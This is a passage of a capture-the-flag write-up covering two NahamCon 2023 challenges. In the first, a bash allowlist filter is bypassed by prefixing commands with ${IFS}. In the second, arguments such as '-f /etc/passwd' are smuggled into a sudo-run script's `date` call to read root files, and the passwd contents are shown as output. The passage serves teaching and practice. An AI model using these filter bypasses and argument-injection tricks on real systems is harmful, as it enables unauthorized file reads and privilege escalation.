	srcset="/p/nahamconctf_2023/images/20230615162731_hu3803344413944780576.png 480w, /p/nahamconctf_2023/images/20230615162731_hu16807096555331210404.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615162731.png"
	
	
		class="gallery-image" 
		data-flex-grow="854"
		data-flex-basis="2051px"
	
></p>
<p><code>flag{323264294cc2a4ebb2c8d5f9e0afb0f7}</code></p>
<h3 id="one-zero">One Zero
</h3><blockquote>
<p>Author: @JohnHammond#6971</p>
<p>You only get one zero. ;)</p>
</blockquote>
<hr>
<p><em>NOTE</em>, <em>This solution utilizes an unintended interaction</em>.</p>
<p>We are given a file to see the restrictions placed. Once we are ready to give it a try, we ssh to their designated port.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">shopt</span> -s extdebug
</span></span><span class="line"><span class="cl"><span class="k">function</span> one_zero<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$BASH_COMMAND</span><span class="s2">&#34;</span> <span class="o">=</span>~ ^<span class="o">[</span><span class="se">\$\&amp;</span>+:<span class="se">\;</span><span class="o">=</span><span class="se">\?</span>@<span class="se">\#</span><span class="p">|</span><span class="se">\&lt;\&gt;</span>.<span class="se">\^\*</span><span class="o">()</span><span class="se">\%\!</span>0-<span class="o">]</span>+ <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="nv">num_zero</span><span class="o">=</span><span class="k">$(</span>awk <span class="s1">&#39;{print gsub(/0/, &#34;&#34;)}&#39;</span> <span class="o">&lt;&lt;&lt;</span> <span class="s2">&#34;</span><span class="nv">$BASH_COMMAND</span><span class="s2">&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[[</span> <span class="nv">$num_zero</span> -le <span class="m">1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">            <span class="nb">echo</span> <span class="s2">&#34;You are only allowed one zero. :)&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> 1<span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Sorry, you used a character that is not in the allowlist!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> 1<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">trap</span> <span class="s1">&#39;one_zero&#39;</span> DEBUG
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can see there is a very strict character on the allowlist, but also that more than 1 zero and we trip the 2nd if statement, telling us only 1 zero allowed.</p>
<p>Jumping right in I learned that we can still pass env variables:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@one_zero:~$ <span class="nv">$TERM</span>
</span></span><span class="line"><span class="cl">bash: xterm-256color: <span class="nb">command</span> not found
</span></span><span class="line"><span class="cl">user@one_zero:~$ <span class="nv">$HOME</span>
</span></span><span class="line"><span class="cl">bash: /home/user: Is a directory
</span></span></code></pre></td></tr></table>
</div>
</div><p>In these cases, I don&rsquo;t even need my precious zero! But what to do with them? The answer is not so clear.
Next I found that I can append letter characters after a zero, and I still bypass the allowlist:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@one_zero:~$ 0whoami
</span></span><span class="line"><span class="cl">bash: 0whoami: <span class="nb">command</span> not found
</span></span></code></pre></td></tr></table>
</div>
</div><p>So far nothing is workable. After attempting some other additional operators:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@one_zero:~$ 0<span class="o">||</span>whoami
</span></span><span class="line"><span class="cl">bash: 0: <span class="nb">command</span> not found
</span></span><span class="line"><span class="cl">Sorry, you used a character that is not in the allowlist!
</span></span></code></pre></td></tr></table>
</div>
</div><p>My operators are not exactly blacklisted, but being 2 separate commands still goes through the allowlist check, which my whoami inevitably fails.</p>
<p>I know the bash special variable <code>$IFS</code> is known to be rather effective at bypassing some tricky filter settings, so I decided to try it out here and see what happens:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@one_zero:~$ <span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>whoami
</span></span><span class="line"><span class="cl">user
</span></span><span class="line"><span class="cl">user@one_zero:~$ <span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>ls
</span></span><span class="line"><span class="cl">flag.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>In an unexpected twist, it appears using $IFS at the start of the command results in any subsequent input bypassing the filter!
From here it&rsquo;s a simple <code>cat</code> away:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@one_zero:~$ <span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>cat flag.txt
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>81b9de37f5bd218c9f59ac2d9d709bf6<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="wordle-bash">Wordle Bash
</h3><blockquote>
<p>Author: @JohnHammond#6971</p>
<p>We put a new novel spin on the old classic game of Wordle! Now it&rsquo;s written in bash! :D</p>
<p>Oh, and you aren&rsquo;t guessing words, this time&hellip;</p>
</blockquote>
<hr>
<p>Upon ssh, we find the wordle challenge. It&rsquo;s umpiled shell code, so firstly let&rsquo;s take a look:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="nv">YEARS</span><span class="o">=(</span><span class="s2">&#34;2020&#34;</span> <span class="s2">&#34;2021&#34;</span> <span class="s2">&#34;2022&#34;</span> <span class="s2">&#34;2023&#34;</span> <span class="s2">&#34;2024&#34;</span> <span class="s2">&#34;2025&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">MONTHS</span><span class="o">=(</span><span class="s2">&#34;01&#34;</span> <span class="s2">&#34;02&#34;</span> <span class="s2">&#34;03&#34;</span> <span class="s2">&#34;04&#34;</span> <span class="s2">&#34;05&#34;</span> <span class="s2">&#34;06&#34;</span> <span class="s2">&#34;07&#34;</span> <span class="s2">&#34;08&#34;</span> <span class="s2">&#34;09&#34;</span> <span class="s2">&#34;10&#34;</span> <span class="s2">&#34;11&#34;</span> <span class="s2">&#34;12&#34;</span> <span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">DAYS</span><span class="o">=(</span><span class="s2">&#34;01&#34;</span> <span class="s2">&#34;02&#34;</span> <span class="s2">&#34;03&#34;</span> <span class="s2">&#34;04&#34;</span> <span class="s2">&#34;05&#34;</span> <span class="s2">&#34;06&#34;</span> <span class="s2">&#34;07&#34;</span> <span class="s2">&#34;08&#34;</span> <span class="s2">&#34;09&#34;</span> <span class="s2">&#34;10&#34;</span> <span class="s2">&#34;11&#34;</span> <span class="s2">&#34;12&#34;</span> <span class="s2">&#34;13&#34;</span> <span class="s2">&#34;14&#34;</span> <span class="s2">&#34;15&#34;</span> <span class="s2">&#34;16&#34;</span> <span class="s2">&#34;17&#34;</span> <span class="s2">&#34;18&#34;</span> <span class="s2">&#34;19&#34;</span> <span class="s2">&#34;20&#34;</span> <span class="s2">&#34;21&#34;</span> <span class="s2">&#34;22&#34;</span> <span class="s2">&#34;23&#34;</span> <span class="s2">&#34;24&#34;</span> <span class="s2">&#34;25&#34;</span> <span class="s2">&#34;26&#34;</span> <span class="s2">&#34;27&#34;</span> <span class="s2">&#34;28&#34;</span> <span class="s2">&#34;29&#34;</span> <span class="s2">&#34;30&#34;</span> <span class="s2">&#34;31&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">YEARS_SIZE</span><span class="o">=</span><span class="si">${#</span><span class="nv">YEARS</span><span class="p">[@]</span><span class="si">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">YEARS_INDEX</span><span class="o">=</span><span class="k">$((</span><span class="nv">$RANDOM</span> <span class="o">%</span> <span class="nv">$YEARS_SIZE</span><span class="k">))</span>
</span></span><span class="line"><span class="cl"><span class="nv">YEAR</span><span class="o">=</span><span class="si">${</span><span class="nv">YEARS</span><span class="p">[</span><span class="nv">$YEARS_INDEX</span><span class="p">]</span><span class="si">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">MONTHS_SIZE</span><span class="o">=</span><span class="si">${#</span><span class="nv">MONTHS</span><span class="p">[@]</span><span class="si">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">MONTHS_INDEX</span><span class="o">=</span><span class="k">$((</span><span class="nv">$RANDOM</span> <span class="o">%</span> <span class="nv">$MONTHS_SIZE</span><span class="k">))</span>
</span></span><span class="line"><span class="cl"><span class="nv">MONTH</span><span class="o">=</span><span class="si">${</span><span class="nv">MONTHS</span><span class="p">[</span><span class="nv">$MONTHS_INDEX</span><span class="p">]</span><span class="si">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">DAYS_SIZE</span><span class="o">=</span><span class="si">${#</span><span class="nv">DAYS</span><span class="p">[@]</span><span class="si">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">DAYS_INDEX</span><span class="o">=</span><span class="k">$((</span><span class="nv">$RANDOM</span> <span class="o">%</span> <span class="nv">$DAYS_SIZE</span><span class="k">))</span>
</span></span><span class="line"><span class="cl"><span class="nv">DAY</span><span class="o">=</span><span class="si">${</span><span class="nv">DAYS</span><span class="p">[</span><span class="nv">$DAYS_INDEX</span><span class="p">]</span><span class="si">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">TARGET_DATE</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">YEAR</span><span class="si">}</span><span class="s2">-</span><span class="si">${</span><span class="nv">MONTH</span><span class="si">}</span><span class="s2">-</span><span class="si">${</span><span class="nv">DAY</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">gum style <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --foreground <span class="m">212</span> --border-foreground <span class="m">212</span> --border double <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --align center --width <span class="m">50</span> --margin <span class="s2">&#34;1 2&#34;</span> --padding <span class="s2">&#34;2 4&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  <span class="s1">&#39;WORDLE DATE&#39;</span> <span class="s1">&#39;Uncover the correct date!&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;We&#39;ve selected a random date, and it&#39;s up to you to guess it!&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">wordle_attempts</span><span class="o">=</span><span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="o">[</span> <span class="nv">$wordle_attempts</span> -le <span class="m">5</span> <span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;Attempt </span><span class="nv">$wordle_attempts</span><span class="s2">:&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;Please select the year you think we&#39;ve chosen:&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">chosen_year</span><span class="o">=</span><span class="k">$(</span>gum choose <span class="si">${</span><span class="nv">YEARS</span><span class="p">[@]</span><span class="si">}</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;Now, enter the month of your guess: &#34;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">chosen_month</span><span class="o">=</span><span class="k">$(</span>gum choose <span class="si">${</span><span class="nv">MONTHS</span><span class="p">[@]</span><span class="si">}</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;Finally, enter the day of your guess: &#34;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">chosen_day</span><span class="o">=</span><span class="k">$(</span>gum choose <span class="si">${</span><span class="nv">DAYS</span><span class="p">[@]</span><span class="si">}</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="nv">guess_date</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$chosen_year</span><span class="s2">-</span><span class="nv">$chosen_month</span><span class="s2">-</span><span class="nv">$chosen_day</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="k">if</span> ! date -d <span class="nv">$guess_date</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Invalid date! Your guess must be a valid date in the format YYYY-MM-DD.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span>
</span></span><span class="line"><span class="cl">  <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nv">confirmed</span><span class="o">=</span><span class="m">1</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="o">[</span> <span class="nv">$confirmed</span> -ne <span class="m">0</span> <span class="o">]</span>
</span></span><span class="line"><span class="cl">  <span class="k">do</span>
</span></span><span class="line"><span class="cl">    gum confirm <span class="s2">&#34;You&#39;ve entered &#39;</span><span class="nv">$guess_date</span><span class="s2">&#39;. Is that right?&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">confirmed</span><span class="o">=</span><span class="nv">$?</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[[</span> <span class="nv">$confirmed</span> -eq <span class="m">0</span> <span class="o">]]</span>
</span></span><span class="line"><span class="cl">    <span class="k">then</span>
</span></span><span class="line"><span class="cl">      <span class="nb">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Please select the date you meant:&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">guess_date</span><span class="o">=</span><span class="k">$(</span>gum input --placeholder <span class="nv">$guess_date</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">  <span class="k">done</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="o">[[</span> <span class="k">$(</span>date <span class="nv">$guess_date</span><span class="k">)</span> <span class="o">==</span> <span class="k">$(</span>date -d <span class="nv">$TARGET_DATE</span> +%Y-%m-%d<span class="k">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    gum style <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>      --foreground <span class="m">212</span> --border-foreground <span class="m">212</span> --border double <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>      --align center --width <span class="m">50</span> --margin <span class="s2">&#34;1 2&#34;</span> --padding <span class="s2">&#34;2 4&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>      <span class="s2">&#34;Congratulations, you&#39;ve won! You correctly guessed the date!&#34;</span> <span class="s1">&#39;Your flag is:&#39;</span> <span class="k">$(</span>cat /root/flag.txt<span class="k">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Sorry, that wasn&#39;t correct!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;=====================================&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nv">wordle_attempts</span><span class="o">=</span><span class="k">$((</span>wordle_attempts+1<span class="k">))</span>
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">gum style <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --foreground <span class="m">212</span> --border-foreground <span class="m">212</span> --border double <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --align center --width <span class="m">50</span> --margin <span class="s2">&#34;1 2&#34;</span> --padding <span class="s2">&#34;2 4&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  <span class="s2">&#34;Sorry, you lost.&#34;</span> <span class="s2">&#34;The correct date was </span><span class="nv">$TARGET_DATE</span><span class="s2">.&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can see the dates are generated &ldquo;randomly&rdquo; upon launch, so my first thought is to run 2 instances simultaneously. If the dates can match up, then it will be an easy win:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@wordle:~$ ./wordle_bash.sh <span class="p">&amp;</span> ./wordle_bash.sh
</span></span></code></pre></td></tr></table>
</div>
</div><p>It works as expected, but I hadn&rsquo;t considered that in order to see the flag it had to be run as sudo. A quick check on sudo privs shows me that I am indeed capable:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@wordle:~$ sudo -l
</span></span><span class="line"><span class="cl">&lt;... SNIP ...&gt;
</span></span><span class="line"><span class="cl">User user may run the following commands on wordle-bash-d18d8fe5e302e98a-89966b69d-lv5gw:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> /home/user/wordle_bash.sh
</span></span></code></pre></td></tr></table>
</div>
</div><p>However, running 2 sudo instances became very problematic, as I am asked for password on every launch. If one sudo process is immediately sent to <code>bg</code>, it will fail to launch once i try to <code>fg</code>, since the password had not really been submitted.</p>
<p>After spending too long on trying to run 2 processes simultaneously, I looked more thoroughly at the userinput we could control. I noticed that after selecting dates, you are asked confirmation. If you say no, you can supply your own input with interesting results:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Please <span class="k">select</span> the date you meant:
</span></span><span class="line"><span class="cl">                                                          
</span></span><span class="line"><span class="cl">You<span class="s1">&#39;ve entered &#39;</span>-d <span class="nv">$TARGET_DATE</span> +%Y-%m-%d<span class="s1">&#39;. Is that right?
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äò$TARGET_DATE‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">Sorry, that wasn&#39;</span>t correct!
</span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>date</code> function seems to be recognizing the -d flag without issue? Perhaps we are able to provide our own arguments to execute.</p>
<p>The <a class="link" href="https://gtfobins.github.io/gtfobins/date/"  target="_blank" rel="noopener"
    >GTFObins</a> site has a page for <code>date</code>; we might be able to utilize arbitrary read capabilities.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Please <span class="k">select</span> the date you meant:
</span></span><span class="line"><span class="cl">                                               
</span></span><span class="line"><span class="cl">You<span class="s1">&#39;ve entered &#39;</span>-f /etc/passwd<span class="s1">&#39;. Is that right?
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòroot:x:0:0:root:/root:/bin/bash‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòbin:x:1:1:bin:/bin:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòdaemon:x:2:2:daemon:/sbin:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòadm:x:3:4:adm:/var/adm:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòsync:x:5:0:sync:/sbin:/bin/sync‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòhalt:x:7:0:halt:/sbin:/sbin/halt‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòmail:x:8:12:mail:/var/mail:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äònews:x:9:13:news:/usr/lib/news:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòoperator:x:11:0:operator:/root:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòman:x:13:15:man:/usr/man:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòpostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòcron:x:16:16:cron:/var/spool/cron:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòftp:x:21:21::/var/lib/ftp:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòsshd:x:22:22:sshd:/dev/null:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äògames:x:35:35:games:/usr/games:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòcyrus:x:85:12::/usr/cyrus:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòvpopmail:x:89:89::/var/vpopmail:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòntp:x:123:123:NTP:/var/empty:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòguest:x:405:100:guest:/dev/null:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äònobody:x:65534:65534:nobody:/:/sbin/nologin‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äòuser:x:1000:1000:Linux User,,,:/home/user:/home/user/.user-entrypoint.sh‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">Sorry, that wasn&#39;</span>t correct!
</span></span></code></pre></td></tr></table>
</div>
</div><p>With arbitrary read, we should be able to display the contents of the flag.txt as well!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
